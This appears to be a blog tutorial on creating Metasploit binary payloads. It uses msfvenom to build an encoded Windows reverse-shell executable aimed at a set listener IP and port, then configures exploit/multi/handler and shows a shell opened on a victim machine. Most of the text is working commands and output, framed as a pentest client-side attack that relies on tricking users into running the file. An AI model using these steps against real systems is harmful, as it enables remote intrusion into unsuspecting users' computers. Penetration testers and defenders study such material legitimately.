---
draft: false
title: MSF Binary Payloads
linkTitle: MSF Binary Payloads
translationKey: msf-binary-payloads
weight: 220
date: 2017-05-20T13:10:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: Metasploit Framework provides many modules for creating malicious codes. In this article, we will create a payload that opens a Windows reverse shell.
url: /tr/msf-binary-payloads/
featured_image: /images/metasploit.jpg
categories:
   - Metasploit Framework
tags:
   - cybersecurity
   - metasploit framework
---
## Client-Sided Attacks

Client-side attacks are the type of attacks that all network administrators should be careful about. No matter how much you secure your system, client-side attacks exploit your users' vulnerabilities.

When pentesters somehow get the user on the system to click on a link or run malware, they open a door to the target system for themselves. For this reason, client-side attacks require interaction with the user. Such attacks also require social engineering efforts.

Metasploit Framework provides many modules for creating such malicious codes.

## binary payloads

Executable files called binary payloads look like harmless .exe files, but they are actually files that contain dangerous codes. The user who will receive the file is made to click on it by making it feel like it is an important file, and the malicious code runs.

In this article, the `msfvenom` command line tool provided by Metasploit Framework will be used. Using `msfvenom` you can obtain `.exe`, `perl` or `c` program outputs. The `.exe` format will be used here.

## Creating a Payload that Opens Windows Reverse Shell

We will use the `windows/shell/reverse_tcp` module to create a payload for the target user to connect to the listening IP address when the malicious program is run. First, let's look at what variables this module needs to work.

```bash
root@kali:~# msfvenom --payload-options -p windows/shell/reverse_tcp
Options for **payload/windows/shell/reverse_tcp:
 Name: Windows Command Shell, Reverse TCP Stager
 Module: payload/windows/shell/reverse_tcp
 Platform: Windows
 Arch: x86
Needs Admin: No
 Total size: 281
 Rank: Normal

Provided by:
 spoonm
 page
 hdm
 skape

Basic options:
Name Current Setting Required Description
---- --------------- -------- -----------
EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none)
LHOST yes The listen address
LPORT 4444 yes The listening port

Description:
 Spawn a piped command shell (staged). Connect back to the attacker
```

This module requires the `LHOST` and `LPORT` variables to be set, as seen in the output. The target platform is x86 architecture and Windows operating system. We need to use an encoder for the payload we will create. For this, we will use the `x86/shikata_ga_nai` encoder module. Under these conditions, the following command will create a file named `1.exe` in the `/tmp` folder using the encoder.

```bash
root@kali:~# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=172.16.104.130 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai chosen with final size 326
Payload size: 326 bytes
Saved as: /tmp/1.exe
```

Let's check the type of our `1.exe` file. In the check we made with the `file` command, it is seen below that the `1.exe` file is an MS Windows file.

```bash
root@kali:~# file /tmp/1.exe
/tmp/1.exe: PE32 executable (GUI) Intel 80386, for **MS Windows
```

## Listening Settings

We now have the `1.exe` file that the client will click and run. Now, we need to run a module that will listen when the click is performed. For this, we will use the `exploit/multi/handler` module and the `payload windows/shell/reverse_tcp` listener payload in it.

First, let's load the `exploit/multi/handler` module and look at the options.

```bash
msf > use exploit/multi/handler
msf exploit(handler) > show options

Module options:

 Name Current Setting Required Description
 ---- --------------- -------- -----------
Exploit target:

   Id  Name            
   --  ----            
   0   Wildcard Target
```

As you can see, there are no mandatory variables in the exploit module. Now let's set the payload.

```bash
msf exploit(handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf exploit(handler) > show options

Module options:

 Name Current Setting Required Description
 ---- --------------- -------- -----------
Payload options (windows/shell/reverse_tcp):

 Name Current Setting Required Description
 ---- --------------- -------- -----------
 EXITFUNC thread yes Exit technique: seh, thread, process
 LHOST yes The local address
 LPORT 4444 yes The local port
Exploit target:

 Id Name
 -- ----
 0 Wildcard Target
```

This output shows that `LHOST` and `LPORT` values ​​must be entered for Payload.

`LHOST`: Local Host, i.e. the IP address that will listen locally,

`LPORT`: Local Port, i.e. the Port number that will listen.

Make sure that these values ​​are the same as the values ​​we entered for the `1.exe` file that we created with the `msfvenom` command. The malware will want to communicate according to the values ​​embedded in the `1.exe` file.

```bash
msf exploit(handler) > set LHOST 172.16.104.130
LHOST => 172.16.104.130
msf exploit(handler) > set LPORT 31337
LPORT => 31337
msf exploit(handler) >
```

After making all the settings, the module is run with the `exploit` command and listening is started. Below is the command line that opens as a result of a client click as a result of listening.

```bash
msf exploit(handler) > exploit

> Handler binding to LHOST 0.0.0.0
> Started reverse handler
> Starting the payload handler...
> Sending stage (474 ​​bytes)
> Command shell session 2 opened (172.16.104.130:31337 -> 172.16.104.128:1150)

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\Victim\My Documents>
```
